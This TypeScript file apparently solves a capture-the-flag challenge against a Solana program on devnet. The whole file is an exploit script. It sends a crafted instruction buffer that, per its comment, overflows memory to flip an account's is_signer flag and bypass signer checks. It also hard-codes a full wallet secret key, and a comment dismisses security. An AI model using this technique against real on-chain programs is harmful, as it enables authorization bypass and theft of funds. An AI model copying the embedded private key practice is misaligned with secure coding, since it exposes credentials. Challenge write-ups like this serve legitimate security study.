import {
    Connection,
    Keypair,
    PublicKey,
    Transaction,
    TransactionInstruction,
    clusterApiUrl,
    sendAndConfirmTransaction,
    SystemProgram
} from "@solana/web3.js";

async function callProgram() {
    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");

    const programId = new PublicKey("ChaT3c8JFUYtKDF8w27BzXygXHDFY5SBLADYR7SjgHBo");
    // This is an example, i dont care about security xD!
    const payer = Keypair.fromSecretKey(
        Uint8Array.from(
            [99, 43, 147, 15, 255, 88, 251, 249, 59, 196, 206, 115, 215, 95, 99,
                60, 178, 96, 54, 195, 15, 223, 120, 78, 99, 30, 97, 93, 119, 14, 115,
                84, 147, 69, 30, 117, 58, 150, 128, 58, 22, 101, 167, 131, 121, 250,
                209, 203, 54, 220, 33, 199, 44, 87, 33, 43, 164, 185, 116, 12, 169,
                14, 195, 195]
        )
    );

    const authority = new PublicKey("Andy1111111111111111111111111111111111111111");
    const pAccount = new PublicKey("HBoeDuEf8KPTQCyccDj6jVupaFFdHTgsoHGDauqpysRi");

    // const newAccount = Keypair.generate();

    // const rating = 5;
    // const data = Buffer.alloc(8);
    // // data.writeBigInt64LE(rating);
    // data.writeBigUInt64LE(BigInt(rating));
    // console.log(data);

    // ==> Resolution of the challenge
    // The buffer Buffer.from([13, 5, 0, 0, 0, 0, 0, 0, 0]) represents a value in little-endian format, 
    // which translates to 1293. This value is used as an index or offset in the Solana program. 
    // During unsafe memory operations, such as directly manipulating pointers, this large value causes 
    // an overflow that unintentionally overwrites memory regions outside the intended bounds. 
    // By carefully crafting the input, we can target specific metadata in memory—like the is_signer 
    // flag of an account—and flip its value from false to true. This manipulation bypasses critical 
    // validations in the program, effectively exploiting the vulnerability.
    const data = Buffer.from([13, 5, 0, 0, 0, 0, 0, 0, 0]);
    // const lamports = await connection.getMinimumBalanceForRentExemption(89);

    // const programAccountInstruction = SystemProgram.createAccount({
    //     fromPubkey: payer.publicKey,
    //     newAccountPubkey: newAccount.publicKey,
    //     lamports,
    //     space: 89,
    //     programId,
    // });

    const instruction = new TransactionInstruction({
        keys: [
            { pubkey: pAccount, isSigner: false, isWritable: true },
            { pubkey: authority, isSigner: false, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: true },
            { pubkey: payer.publicKey, isSigner: true, isWritable: true },
        ],
        programId,
        data,
    });

    const transaction = new Transaction().add(instruction);

    // const signature = await connection.sendTransaction(transaction, [payer, payer], { skipPreflight: true });
    // console.log("Transaction confirmed with signature:", signature);

    const signature = await sendAndConfirmTransaction(connection, transaction, [payer, payer]);
    console.log("Transaction confirmed with signature:", signature);
}

callProgram().catch(console.error);
